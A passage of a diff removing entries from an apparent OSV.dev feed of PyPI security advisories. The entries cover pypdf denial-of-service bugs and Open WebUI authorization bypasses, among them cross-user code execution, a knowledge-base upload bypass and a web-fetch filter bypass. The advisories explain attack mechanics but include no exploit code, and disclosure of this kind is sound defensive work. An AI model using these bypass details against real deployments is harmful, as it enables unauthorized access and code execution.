href="https://nvd.nist.gov/vuln/detail/CVE-2026-53500"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-53500&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3617"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3611: pypdf: Possible large memory usage for wrong image dimensions</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3611</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3611"/>
-    <published>2026-08-04T11:34:41Z</published>
-    <updated>2026-08-04T14:30:29Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59938"/>
-    <category term="GHSA-5qjq-93h5-hrgp"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;pypdf: Possible large memory usage for wrong image dimensions&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59938, GHSA-5qjq-93h5-hrgp&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;pypdf&lt;/code&gt; — fixed in 6.14.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Impact
-
-An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires loading images where the declared size values are much too large compared to the actual data.
-
-### Patches
-
-This has been fixed in [pypdf==6.14.0](https://github.com/py-pdf/pypdf/releases/tag/6.14.0).
-
-### Workarounds
-
-If you cannot upgrade yet, consider applying the changes from PR [#3888](https://github.com/py-pdf/pypdf/pull/3888).&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-5qjq-93h5-hrgp"&gt;https://github.com/py-pdf/pypdf/security/advisories/GHSA-5qjq-93h5-hrgp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59938"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59938&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/pull/3888"&gt;https://github.com/py-pdf/pypdf/pull/3888&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/commit/c64583be16b8e8763d8777075f8ecbf382014b7a"&gt;https://github.com/py-pdf/pypdf/commit/c64583be16b8e8763d8777075f8ecbf382014b7a&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf"&gt;https://github.com/py-pdf/pypdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/releases/tag/6.14.0"&gt;https://github.com/py-pdf/pypdf/releases/tag/6.14.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/pypdf"&gt;https://pypi.org/project/pypdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-5qjq-93h5-hrgp"&gt;https://github.com/advisories/GHSA-5qjq-93h5-hrgp&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3611"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3612: pypdf: Possible infinite loop for not terminated inline images</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3612</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3612"/>
-    <published>2026-08-04T11:34:41Z</published>
-    <updated>2026-08-04T14:30:29Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59936"/>
-    <category term="GHSA-5xf7-4p34-54qr"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;pypdf: Possible infinite loop for not terminated inline images&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59936, GHSA-5xf7-4p34-54qr&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;pypdf&lt;/code&gt; — fixed in 6.14.1&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Impact
-
-An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires parsing the content stream of a page with a not terminated inline image, as done when extracting the page text for example.
-
-### Patches
-
-This has been fixed in [pypdf==6.14.1](https://github.com/py-pdf/pypdf/releases/tag/6.14.1).
-
-### Workarounds
-
-If you cannot upgrade yet, consider applying the changes from PR [#3891](https://github.com/py-pdf/pypdf/pull/3891).&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-5xf7-4p34-54qr"&gt;https://github.com/py-pdf/pypdf/security/advisories/GHSA-5xf7-4p34-54qr&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59936"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59936&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/pull/3891"&gt;https://github.com/py-pdf/pypdf/pull/3891&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/commit/ec3b14596186c40caca7cf8ab9b2155203e01b5b"&gt;https://github.com/py-pdf/pypdf/commit/ec3b14596186c40caca7cf8ab9b2155203e01b5b&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf"&gt;https://github.com/py-pdf/pypdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/py-pdf/pypdf/releases/tag/6.14.1"&gt;https://github.com/py-pdf/pypdf/releases/tag/6.14.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/pypdf"&gt;https://pypi.org/project/pypdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-5xf7-4p34-54qr"&gt;https://github.com/advisories/GHSA-5xf7-4p34-54qr&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3612"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3605: Open WebUI: Cross-channel message overwrite via chat completion API (single-model and multimodel message_ids)</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3605</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3605"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:29Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59714"/>
-    <category term="GHSA-x2ff-v5v8-m75m"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: Cross-channel message overwrite via chat completion API (single-model and multimodel message_ids)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59714, GHSA-x2ff-v5v8-m75m&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-Any authenticated user can overwrite the content of a message in a channel they do not belong to (including private and DM channels) by sending a chat completion request with a `channel:`-prefixed `chat_id` and a target `message_id`. The `channel:` path routes pipeline output through `_make_channel_emitter`, which writes to the `Messages` table using the caller-supplied `message_id` without binding it to the channel.
-
-This advisory consolidates two filings of the same flaw: the original single-model form, and a multimodel `message_ids` variant that survives the partial fix shipped in v0.9.6 (see &amp;quot;Fix status&amp;quot; below).
-
-## Details (as introduced in v0.9.5)
-
-When a user submits a chat completion request with a `chat_id` starting with `channel:`, three authorization gaps combined in…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-x2ff-v5v8-m75m"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-x2ff-v5v8-m75m&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/33e4e0dcc43afcca80f9c635d762cdc76c768ba9"&gt;https://github.com/open-webui/open-webui/commit/33e4e0dcc43afcca80f9c635d762cdc76c768ba9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/ac3449cac91e62b08a7c28e54fcd044d14dea791"&gt;https://github.com/open-webui/open-webui/commit/ac3449cac91e62b08a7c28e54fcd044d14dea791&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-x2ff-v5v8-m75m"&gt;https://github.com/advisories/GHSA-x2ff-v5v8-m75m&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59714"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59714&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3605"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3592: Open WebUI: Cross-user code-interpreter and tool execution via unvalidated Socket.IO event-caller session_id</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3592</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3592"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:29Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59216"/>
-    <category term="GHSA-74h3-cxq7-vc5q"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: Cross-user code-interpreter and tool execution via unvalidated Socket.IO event-caller session_id&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59216, GHSA-74h3-cxq7-vc5q&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-An authenticated low-privilege user can execute arbitrary code-interpreter Python and tools inside **another** user&amp;#x27;s authenticated session. The Socket.IO event-caller (`get_event_call`) delivers `execute:python` / `execute:tool` events to a **client-supplied** `session_id` after only checking that the session is connected, never that it belongs to the requester. Combined with `ydoc:document:join`, which exposes the live socket ids of everyone in a shared note&amp;#x27;s collaboration room to any read-access participant, an attacker can target a victim&amp;#x27;s session and run attacker-chosen code/tools in the victim&amp;#x27;s browser context. When the victim is an administrator, that hijacked context reaches the admin-only Functions API, whose source is executed server-side, yielding remote code exec…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-74h3-cxq7-vc5q"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-74h3-cxq7-vc5q&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59216"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59216&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/25763"&gt;https://github.com/open-webui/open-webui/pull/25763&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/386ac958144dbbbf0aa6e268070d72b681a318aa"&gt;https://github.com/open-webui/open-webui/commit/386ac958144dbbbf0aa6e268070d72b681a318aa&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-74h3-cxq7-vc5q"&gt;https://github.com/advisories/GHSA-74h3-cxq7-vc5q&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3592"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3593: Open WebUI: Upload `metadata.knowledge_id` bypasses the knowledge-base write-access check (read-only users can add files to KB)</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3593</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3593"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:29Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59217"/>
-    <category term="GHSA-7r7x-gjvr-448g"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: Upload `metadata.knowledge_id` bypasses the knowledge-base write-access check (read-only users can add files to KB)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59217, GHSA-7r7x-gjvr-448g&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;# Open WebUI upload metadata can add files to knowledge bases without write permission
-
-## Summary
-
-Open WebUI&amp;#x27;s file upload background processing trusts the client-supplied `metadata.knowledge_id` value and inserts a `knowledge_file` association before validating that the uploading user has write access to the target knowledge base.
-
-A verified user with only read access to a knowledge base can upload an arbitrary file and set `metadata={&amp;quot;knowledge_id&amp;quot;:&amp;quot;&amp;lt;target knowledge id&amp;gt;&amp;quot;}`. The normal `/api/v1/knowledge/{id}/file/add` endpoint correctly requires knowledge-base write access, but the upload auto-link path bypasses that authorization check.
-
-The immediate result is unauthorized modification of the target knowledge base&amp;#x27;s file membership. The attached attacker-controlled file becomes vis…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-7r7x-gjvr-448g"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-7r7x-gjvr-448g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59217"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59217&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/26001"&gt;https://github.com/open-webui/open-webui/pull/26001&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/b7626f05fb92b24ab923ad81a037071ebd5623d1"&gt;https://github.com/open-webui/open-webui/commit/b7626f05fb92b24ab923ad81a037071ebd5623d1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-7r7x-gjvr-448g"&gt;https://github.com/advisories/GHSA-7r7x-gjvr-448g&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3593"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3604: Open WebUI: POST /api/v1/images/edit bypasses the global image-edit switch and the per-user image-generation permission</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3604</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3604"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:29Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59227"/>
-    <category term="GHSA-rqj7-6wrp-6g2g"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: POST /api/v1/images/edit bypasses the global image-edit switch and the per-user image-generation permission&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59227, GHSA-rqj7-6wrp-6g2g&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-`POST /api/v1/images/edit` performed no authorization beyond requiring a verified account. Every other image-editing surface in Open WebUI enforces the global image-edit switch and the per-user image-generation permission — the `/api/v1/images/generations` route, the built-in `edit_image` tool, and the chat image-edit middleware — but the direct edit route enforced neither. A verified non-admin user could therefore invoke server-side image editing, reaching the configured image-edit provider with the administrator&amp;#x27;s credentials, even when the administrator had globally disabled image editing (`ENABLE_IMAGE_EDIT=False`) or denied that user image-generation permission. The image-editing UI is surfaced only to administrators (Playground), so the route additionally exposed an admin…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-rqj7-6wrp-6g2g"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-rqj7-6wrp-6g2g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59227"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59227&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/26009"&gt;https://github.com/open-webui/open-webui/pull/26009&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/e038bab66dec8d17212eec35b5cb6d6b785a4200"&gt;https://github.com/open-webui/open-webui/commit/e038bab66dec8d17212eec35b5cb6d6b785a4200&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-rqj7-6wrp-6g2g"&gt;https://github.com/advisories/GHSA-rqj7-6wrp-6g2g&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3604"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3601: Open WebUI: Arena task endpoints can bypass underlying model access controls</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3601</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3601"/>
-    <published>2026-08-04T11:34:43Z</published>
-    <updated>2026-08-04T14:30:29Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59225"/>
-    <category term="GHSA-m3qf-58wf-w979"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: Arena task endpoints can bypass underlying model access controls&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59225, GHSA-m3qf-58wf-w979&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-An authenticated non-admin user with read access to an arena wrapper model can reach a restricted underlying model through task endpoints such as `/api/v1/tasks/moa/completions`.
-
-The normal chat route resolves arena models before the final chat dispatch and therefore re-checks the selected underlying model. The task routes call `utils.chat.generate_chat_completion()` directly. In that direct path, arena fallback resolution happens after the wrapper access check and then recurses with `bypass_filter=True`, skipping the selected submodel&amp;#x27;s access check.
-
-## Technical Details
-
-Open WebUI&amp;#x27;s current model-access behavior already denies direct access to the restricted model. The normal chat path also denies the selected restricted model after arena preprocessing. The task endpoint p…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-m3qf-58wf-w979"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-m3qf-58wf-w979&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59225"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59225&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/26046"&gt;https://github.com/open-webui/open-webui/pull/26046&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/dc4924b66e655b315e3be4430a3e51b7d5c20acc"&gt;https://github.com/open-webui/open-webui/commit/dc4924b66e655b315e3be4430a3e51b7d5c20acc&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-m3qf-58wf-w979"&gt;https://github.com/advisories/GHSA-m3qf-58wf-w979&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3601"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3603: Open WebUI: `WEB_FETCH_FILTER_LIST` host allow/block filter bypassable via URL path and non-label-boundary matching</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3603</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3603"/>
-    <published>2026-08-04T11:34:43Z</published>
-    <updated>2026-08-04T14:30:28Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59223"/>
-    <category term="GHSA-qg3f-8x3j-ggf2"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: `WEB_FETCH_FILTER_LIST` host allow/block filter bypassable via URL path and non-label-boundary matching&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59223, GHSA-qg3f-8x3j-ggf2&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-The administrator-configured `WEB_FETCH_FILTER_LIST` (the allow/block list applied to server-side web fetches: RAG URL ingestion, URL-to-markdown, web-search content fetch) matches hostnames incorrectly, so the filter can be bypassed.
-
-## Details
-
-`is_string_allowed` (`backend/open_webui/utils/misc.py`) matches with `str.endswith(...)`, and the primary web-fetch call site (`backend/open_webui/retrieval/web/utils.py`) called it with the **full URL string**, not the hostname:
-
-- **Blocklist bypass via path.** A blocklist entry `!internal.example.com` only matches a URL that *ends with* that string. Any URL with a path (`https://internal.example.com/x`) ends with `/x`, so the entry never matches and the fetch proceeds. The blocklist effectively only stopped path-less URLs.
-- **All…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-qg3f-8x3j-ggf2"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-qg3f-8x3j-ggf2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59223"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59223&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/25949"&gt;https://github.com/open-webui/open-webui/pull/25949&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/087878ce848a4d828012068b5997dac480f43656"&gt;https://github.com/open-webui/open-webui/commit/087878ce848a4d828012068b5997dac480f43656&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-qg3f-8x3j-ggf2"&gt;https://github.com/advisories/GHSA-qg3f-8x3j-ggf2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3603"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3602: Open WebUI: Scheduled automations continue after pending-user deactivation and stored model ACL revocation</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3602</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3602"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:28Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59226"/>
-    <category term="GHSA-mvx4-532p-xfm9"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: Scheduled automations continue after pending-user deactivation and stored model ACL revocation&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59226, GHSA-mvx4-532p-xfm9&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;**Title:** Scheduled automations continue after pending-user deactivation and stored model ACL revocation
-
-### Summary
-
-Open WebUI documents `pending` as a zero-access role used for new sign-ups and deactivated users, and normal HTTP routes enforce that with `get_verified_user()` (which rejects `pending`), while automation create/update/run routes additionally require the `features.automations` permission. Two paths missed that lifecycle gate, so a deactivated (`pending`) account could keep acting through the background automation scheduler:
-
